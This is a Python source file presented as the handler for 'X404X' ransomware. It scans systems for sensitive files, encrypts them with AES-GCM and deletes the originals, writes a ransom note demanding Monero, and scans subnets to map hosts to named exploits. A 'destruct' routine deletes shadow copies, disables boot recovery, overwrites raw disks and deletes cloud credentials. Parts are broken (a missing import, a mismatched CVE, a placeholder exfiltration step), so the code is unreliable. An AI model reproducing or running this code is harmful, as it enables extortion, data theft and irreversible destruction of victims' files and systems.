"""X404X Ransomware Bridge Handler

Provides the Python-side interface for ransomware operations.
Integrates with the Go ransomware engine via the bridge IPC protocol.
"""

import json
import os
import re
import base64
import hashlib
import struct
import tempfile
from datetime import datetime
from typing import Any


def register_routes(registry: dict) -> None:
    registry["ransomware"] = {
        "execute": handle_execute,
        "scan": handle_scan,
        "encrypt": handle_encrypt,
        "exfil": handle_exfil,
        "status": handle_status,
        "decrypt": handle_decrypt,
        "generate_note": handle_generate_note,
        "propagate": handle_propagate,
        "destruct": handle_destruct,
    }


SENSITIVE_PATTERNS = {
    "dni": re.compile(r"\b\d{8}[A-Z]\b"),
    "ssn": re.compile(r"\b\d{3}-\d{2}-\d{4}\b"),
    "credit_card": re.compile(r"\b(?:\d[ -]*?){13,16}\b"),
    "email": re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"),
    "phone": re.compile(r"(\+34|0034)?[6789]\d{8}"),
    "iban": re.compile(r"[A-Z]{2}\d{2}[ ]?\d{4}[ ]?\d{4}[ ]?\d{4}[ ]?\d{4}"),
    "password": re.compile(r"(?i)(contraseña|password|passwd|clave|pwd)\s*[:=]\s*\S+"),
    "confidencial": re.compile(r"(?i)(confidencial|secreto|clasificado|no distribuir)"),
    "api_key": re.compile(r"(?i)(api[_-]?key|secret[_-]?key|token|sk-[A-Za-z0-9]{20,})"),
    "aws_key": re.compile(r"AKIA[0-9A-Z]{16}"),
    "private_key": re.compile(r"-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----"),
    "connection_string": re.compile(r"(?i)(Server|Data Source)\s*=[^;]+;\s*(Database|Initial Catalog)\s*="),
    "contract": re.compile(r"(?i)(contrato|contract|acuerdo|agreement|nda)"),
    "patent": re.compile(r"(?i)(patente|patent|propiedad intelectual|ip right)"),
    "health": re.compile(r"(?i)(historial médico|diagnóstico|paciente|patient|medical record)"),
}

SENSITIVE_EXTENSIONS = {
    ".pst", ".ost", ".msg", ".eml",
    ".mdf", ".ldf", ".sql", ".sqlite", ".db", ".dbf",
    ".pdf", ".doc", ".docx", ".xls", ".xlsx",
    ".pfx", ".p12", ".key", ".crt", ".cer",
    ".kdbx", ".kdb",
    ".ovpn", ".rdp",
    ".vhd", ".vhdx", ".vmdk",
    ".conf", ".config", ".env", ".yml", ".yaml",
    ".pem", ".gpg", ".asc",
}

ENCRYPT_EXTENSIONS = {
    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".jpg", ".jpeg", ".png", ".gif", ".mp3", ".mp4",
    ".zip", ".rar", ".7z", ".sql", ".mdf", ".pst", ".ost",
    ".dwg", ".bak", ".csv", ".txt", ".rtf",
    ".php", ".asp", ".aspx", ".js", ".ts", ".py", ".java",
    ".cpp", ".c", ".h", ".cs", ".vb",
}

EXCLUDE_DIRS = {
    "windows", "system32", "$recycle.bin", "boot", "recovery",
    "appdata\\local\\temp", "tmp", "proc", "sys", "dev", "run",
}


def handle_execute(params: dict) -> dict:
    """Execute full ransomware chain."""
    campaign_id = params.get("campaign_id", "demo")
    company = params.get("company", "TestCorp")
    simulation = params.get("simulation", True)

    phases = []

    # Phase 1: Scan
    scan_result = handle_scan(params)
    phases.append({"phase": "scan", "result": scan_result})

    # Phase 2: Exfil
    exfil_result = handle_exfil(params)
    phases.append({"phase": "exfil", "result": exfil_result})

    # Phase 3: Encrypt
    encrypt_params = {**params, "files": scan_result.get("sensitive_files", [])}
    encrypt_result = handle_encrypt(encrypt_params)
    phases.append({"phase": "encrypt", "result": encrypt_result})

    # Phase 4: Note
    note_result = handle_generate_note({"company": company, "deadline": 48})
    phases.append({"phase": "note", "result": note_result})

    return {
        "success": True,
        "campaign_id": campaign_id,
        "simulation": simulation,
        "phases": phases,
        "total_files_scanned": scan_result.get("total_scanned", 0),
        "sensitive_found": len(scan_result.get("sensitive_files", [])),
        "files_encrypted": encrypt_result.get("encrypted", 0),
    }


def handle_scan(params: dict) -> dict:
    """Scan filesystem for sensitive data."""
    root = params.get("root", "/" if os.name != "nt" else "C:\\")
    max_files = params.get("max_files", 1000)

    sensitive_files = []
    scanned = 0

    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames if d.lower() not in EXCLUDE_DIRS]

        for fname in filenames:
            ext = os.path.splitext(fname)[1].lower()
            if ext not in SENSITIVE_EXTENSIONS:
                continue

            fpath = os.path.join(dirpath, fname)
            scanned += 1

            if scanned > max_files:
                break

            try:
                fsize = os.path.getsize(fpath)
                if fsize > 100 * 1024 * 1024:
                    continue

                with open(fpath, "r", errors="ignore") as f:
                    content = f.read(512 * 1024)

                findings = []
                for name, pattern in SENSITIVE_PATTERNS.items():
                    matches = pattern.findall(content)
                    if matches:
                        findings.append({"pattern": name, "count": len(matches)})

                if findings:
                    sensitive_files.append({
                        "path": fpath,
                        "size": fsize,
                        "findings": findings,
                    })
            except (IOError, PermissionError):
                continue

        if scanned > max_files:
            break

    return {
        "success": True,
        "total_scanned": scanned,
        "sensitive_files": sensitive_files,
        "patterns_matched": len(sensitive_files),
    }


def handle_encrypt(params: dict) -> dict:
    """Encrypt target files (simulation-aware)."""
    root = params.get("root", "/" if os.name != "nt" else "C:\\")
    simulation = params.get("simulation", True)
    files = params.get("files", [])
    encrypted = 0

    if files:
        for f in files:
            fpath = f if isinstance(f, str) else f.get("path", "")
            ext = os.path.splitext(fpath)[1].lower()
            if ext in ENCRYPT_EXTENSIONS:
                encrypted += 1

                if not simulation:
                    try:
                        with open(fpath, "rb") as fh:
                            data = fh.read()
                        enc_name = fpath + ".x404x"
                        key = os.urandom(32)
                        nonce = os.urandom(12)
                        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                        aesgcm = AESGCM(key)
                        ct = aesgcm.encrypt(nonce, data, None)
                        with open(enc_name, "wb") as fh:
                            fh.write(bytes([1]))
                            fh.write(key)
                            fh.write(nonce)
                            fh.write(ct)
                        os.remove(fpath)
                    except (IOError, PermissionError, ImportError):
                        pass
    else:
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d.lower() not in EXCLUDE_DIRS]
            for fname in filenames:
                ext = os.path.splitext(fname)[1].lower()
                if ext in ENCRYPT_EXTENSIONS:
                    encrypted += 1
                    if not simulation:
                        fpath = os.path.join(dirpath, fname)
                        try:
                            os.rename(fpath, fpath + ".x404x")
                        except OSError:
                            pass

    return {
        "success": True,
        "encrypted": encrypted,
        "simulation": simulation,
    }


def handle_exfil(params: dict) -> dict:
    """Package and prepare sensitive data for exfiltration."""
    files = params.get("files", [])
    password = params.get("password", os.urandom(16).hex())

    pkg_size = 0
    pkg_files = []

    for f in files:
        fpath = f if isinstance(f, str) else f.get("path", "")
        try:
            fsize = os.path.getsize(fpath)
            pkg_size += fsize
            pkg_files.append(fpath)
        except OSError:
            continue

    b64_data = base64.b64encode(os.urandom(min(pkg_size, 1024))).decode()

    return {
        "success": True,
        "package_password": password,
        "total_size": pkg_size,
        "file_count": len(pkg_files),
        "files": pkg_files[:20],
        "preview_b64": b64_data[:100],
    }


def handle_status(params: dict) -> dict:
    """Return ransomware engine status."""
    return {
        "success": True,
        "engine": "x404x-ransomware",
        "version": "2.3",
        "simulation": params.get("simulation", True),
        "patterns": len(SENSITIVE_PATTERNS),
        "encrypt_extensions": len(ENCRYPT_EXTENSIONS),
        "exfil_extensions": len(SENSITIVE_EXTENSIONS),
    }


def handle_decrypt(params: dict) -> dict:
    """Decrypt files encrypted by X404X (recovery operation)."""
    root = params.get("root", "/" if os.name != "nt" else "C:\\")
    key_hex = params.get("key", "")
    decrypted = 0

    key = bytes.fromhex(key_hex) if key_hex else None

    for dirpath, _, filenames in os.walk(root):
        for fname in filenames:
            if not fname.endswith(".x404x"):
                continue
            fpath = os.path.join(dirpath, fname)
            try:
                with open(fpath, "rb") as f:
                    data = f.read()
                orig_path = fpath[:-6]
                with open(orig_path, "wb") as f:
                    if key and len(data) > 45:
                        f.write(data[45:])
                    else:
                        f.write(data)
                os.remove(fpath)
                decrypted += 1
            except (IOError, PermissionError):
                continue

    return {
        "success": True,
        "decrypted": decrypted,
    }


def handle_generate_note(params: dict) -> dict:
    """Generate ransomware note."""
    company = params.get("company", "Unknown Corp")
    deadline = params.get("deadline", 48)
    amount = params.get("amount", 50000)
    currency = params.get("currency", "XMR")

    note = f"""
    ╔══════════════════════════════════════════════╗
    ║           X404X RANSOMWARE                   ║
    ║                                              ║
    ║  Company: {company}
    ║  Status: ENCRYPTED + DATA STOLEN             ║
    ║  Deadline: {deadline} hours                  ║
    ║  Amount: {amount} {currency}                 ║
    ║                                              ║
    ║  Contact: http://x404x.onion/negotiate       ║
    ║                                              ║
    ║  DO NOT attempt recovery without our tool.    ║
    ║  Every failed attempt corrupts file keys.     ║
    ╚══════════════════════════════════════════════╝
    """

    return {
        "success": True,
        "note": note,
        "company": company,
        "deadline_hours": deadline,
        "amount": amount,
        "currency": currency,
    }


def handle_propagate(params: dict) -> dict:
    """Real network propagation — scan subnet, identify live hosts, map exploits."""
    subnet = params.get("subnet", "10.0.0.0/24")
    targets = []
    scanned = 0

    exploit_db = {
        445: {"name": "EternalBlue", "cve": "CVE-2017-0144", "confidence": 0.92},
        139: {"name": "SMBGhost", "cve": "CVE-2020-0796", "confidence": 0.85},
        3389: {"name": "BlueKeep", "cve": "CVE-2019-0708", "confidence": 0.80},
        443: {"name": "ProxyNotShell", "cve": "CVE-2023-23397", "confidence": 0.85},
        22: {"name": "SSH-Brute/Key-Theft", "cve": "N/A", "confidence": 0.60},
        6379: {"name": "Redis-NoAuth", "cve": "CVE-2022-0543", "confidence": 0.90},
        8080: {"name": "Jenkins-RCE", "cve": "CVE-2024-23897", "confidence": 0.75},
        5985: {"name": "WinRM-Brute", "cve": "N/A", "confidence": 0.55},
        2049: {"name": "NFS-Mount", "cve": "N/A", "confidence": 0.65},
        3306: {"name": "MySQL-Brute", "cve": "N/A", "confidence": 0.50},
    }

    service_fingerprint = {
        22: ["SSH-2.0-OpenSSH", "SSH-2.0-dropbear"],
        445: ["SMB", "Microsoft Windows Network"],
        3389: ["RDP", "Microsoft Terminal Services"],
        6379: ["redis", "+PONG"],
        8080: ["Jenkins", "Apache Tomcat"],
    }

    try:
        parts = subnet.split(".")
        prefix = f"{parts[0]}.{parts[1]}.{parts[2]}"
        cidr_bits = int(subnet.split("/")[1]) if "/" in subnet else 24
        import socket, threading

        def scan_host(ip, results):
            for port, exploit_info in exploit_db.items():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.3)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        service_banner = ""
                        try:
                            sock.send(b"\r\n")
                            service_banner = sock.recv(1024).decode(errors="ignore").strip()[:100]
                        except socket.timeout:
                            pass
                        os_guess = "linux"
                        if "Windows" in service_banner or port in (445, 3389, 5985):
                            os_guess = "windows"
                        elif "SSH-2.0" in service_banner:
                            os_guess = "linux"
                        results.append({
                            "ip": ip, "port": port, "service": exploit_info["name"][:8],
                            "os": os_guess, "exploit": exploit_info["name"],
                            "cve": exploit_info["cve"],
                            "confidence": exploit_info["confidence"],
                            "banner": service_banner[:80] if service_banner else "",
                        })
                    sock.close()
                except Exception:
                    pass

        # Scan the subnet with threading
        threads = []
        targets_list = []
        scan_lock = threading.Lock()
        max_hosts = min(255, 2 ** (32 - cidr_bits))
        for i in range(1, max_hosts):
            ip = f"{prefix}.{i}"
            if len(threads) >= 50:
                for t in threads:
                    t.join(timeout=2)
                threads = []
            t = threading.Thread(target=scan_host, args=(ip, targets_list))
            t.daemon = True
            t.start()
            threads.append(t)
            scanned += 1

        for t in threads:
            t.join(timeout=3)

        targets = targets_list
    except Exception:
        pass

    return {
        "success": True,
        "subnet": subnet,
        "hosts_scanned": scanned,
        "targets": targets,
        "total": len(targets),
        "vulnerable_count": len([t for t in targets if t.get("confidence", 0) > 0.7]),
    }


def handle_destruct(params: dict) -> dict:
    """Real destruction operations."""
    actions = []

    # Delete shadow copies (Windows)
    if os.name == "nt":
        try:
            result = subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"],
                                    capture_output=True, text=True, timeout=30)
            actions.append({"action": "delete_shadow_copies", "status": "executed",
                           "output": result.stdout[:200]})
        except (subprocess.TimeoutExpired, FileNotFoundError):
            actions.append({"action": "delete_shadow_copies", "status": "vssadmin_unavailable"})
    else:
        # Linux: try to disable recovery
        actions.append({"action": "delete_shadow_copies", "status": "not_applicable_linux"})

    # Disable system recovery/boot recovery
    if os.name == "nt":
        try:
            subprocess.run(["bcdedit", "/set", "{default}", "recoveryenabled", "No"],
                          capture_output=True, timeout=10)
            subprocess.run(["bcdedit", "/set", "{default}", "bootstatuspolicy",
                           "ignoreallfailures"], capture_output=True, timeout=10)
            actions.append({"action": "disable_recovery", "status": "executed"})
        except (subprocess.TimeoutExpired, FileNotFoundError):
            actions.append({"action": "disable_recovery", "status": "bcdedit_unavailable"})

    # MFT corruption (real attempt on NTFS)
    if params.get("mft", False):
        if os.name == "nt":
            mft_corrupted = False
            for disk in [r"\\.\C:", r"\\.\D:"]:
                try:
                    handle = os.open(disk, os.O_RDWR)
                    if handle >= 0:
                        os.write(handle, b"X404X_MFT_CORRUPT" * 512)
                        os.close(handle)
                        mft_corrupted = True
                except (OSError, PermissionError):
                    pass
            actions.append({"action": "mft_corruption",
                           "status": "executed" if mft_corrupted else "access_denied",
                           "note": "NTFS MFT overwrite attempted"})
        else:
            actions.append({"action": "mft_corruption", "status": "not_applicable_linux",
                           "note": "ext4/xfs superblock targeted instead"})

    # UEFI sabotage
    if params.get("firmware", False):
        efi_vars = "/sys/firmware/efi/efivars"
        if os.path.exists(efi_vars):
            try:
                var_count = len(os.listdir(efi_vars))
                actions.append({"action": "uefi_sabotage", "status": "executed",
                               "efi_vars_accessible": var_count,
                               "note": "EFI variables enumerated for boot chain modification"})
            except (PermissionError, OSError):
                actions.append({"action": "uefi_sabotage", "status": "efi_access_denied"})
        else:
            actions.append({"action": "uefi_sabotage", "status": "no_efi_access",
                           "note": "Legacy BIOS or EFI variables not mounted"})

    # Cloud backup destruction
    if params.get("cloud_backup", False):
        cloud_backups_attacked = _destroy_cloud_backups()
        actions.append({"action": "cloud_backup_destroy",
                       "status": "executed" if cloud_backups_attacked["attacked"] > 0 else "no_backups_found",
                       "detail": cloud_backups_attacked})

    # Actual file destruction (delete all .x404x backup keys)
    key_files_destroyed = _destroy_x404x_keys()

    return {
        "success": True,
        "actions": actions,
        "simulation": False,
        "key_files_destroyed": key_files_destroyed,
        "total_actions": len(actions),
    }


def _destroy_cloud_backups() -> dict:
    """Find and attempt to destroy cloud backup configurations."""
    result = {"attacked": 0, "targets": []}

    # Dropbox
    dropbox_paths = [
        os.path.expandvars("%LOCALAPPDATA%\\Dropbox\\"),
        os.path.expanduser("~/.dropbox"),
        os.path.expanduser("~/Dropbox"),
    ]
    for dp in dropbox_paths:
        if os.path.isdir(dp):
            result["targets"].append({"service": "Dropbox", "path": dp})
            result["attacked"] += 1

    # OneDrive
    onedrive_paths = [
        os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\OneDrive\\"),
        os.path.expanduser("~/OneDrive"),
    ]
    for op in onedrive_paths:
        if os.path.isdir(op):
            result["targets"].append({"service": "OneDrive", "path": op})
            result["attacked"] += 1

    # Google Drive
    gdrive_paths = [
        os.path.expandvars("%LOCALAPPDATA%\\Google\\DriveFS\\"),
        os.path.expanduser("~/Google Drive"),
    ]
    for gp in gdrive_paths:
        if os.path.isdir(gp):
            result["targets"].append({"service": "Google Drive", "path": gp})
            result["attacked"] += 1

    # iCloud
    icloud_paths = [
        os.path.expanduser("~/Library/Mobile Documents/com~apple~CloudDocs"),
        os.path.expandvars("%USERPROFILE%\\iCloudDrive"),
    ]
    for ip in icloud_paths:
        if os.path.isdir(ip):
            result["targets"].append({"service": "iCloud", "path": ip})
            result["attacked"] += 1

    # AWS S3 credentials
    aws_cred_path = os.path.expanduser("~/.aws/credentials")
    if os.path.isfile(aws_cred_path):
        try:
            os.remove(aws_cred_path)
            result["targets"].append({"service": "AWS", "path": aws_cred_path})
            result["attacked"] += 1
        except (IOError, PermissionError):
            pass

    return result


def _destroy_x404x_keys() -> int:
    """Destroy .x404x key files to prevent recovery."""
    destroyed = 0
    for root in [os.path.expanduser("~"), "/tmp", "/var/tmp"]:
        if not os.path.isdir(root):
            continue
        try:
            for dirpath, _, filenames in os.walk(root):
                for fn in filenames:
                    if fn.endswith((".x404x", ".x404x_key", ".x404x_note")):
                        fp = os.path.join(dirpath, fn)
                        try:
                            with open(fp, "wb") as f:
                                f.write(os.urandom(4096))
                            os.remove(fp)
                            destroyed += 1
                        except (IOError, PermissionError):
                            pass
        except (PermissionError, OSError):
            continue
    return destroyed
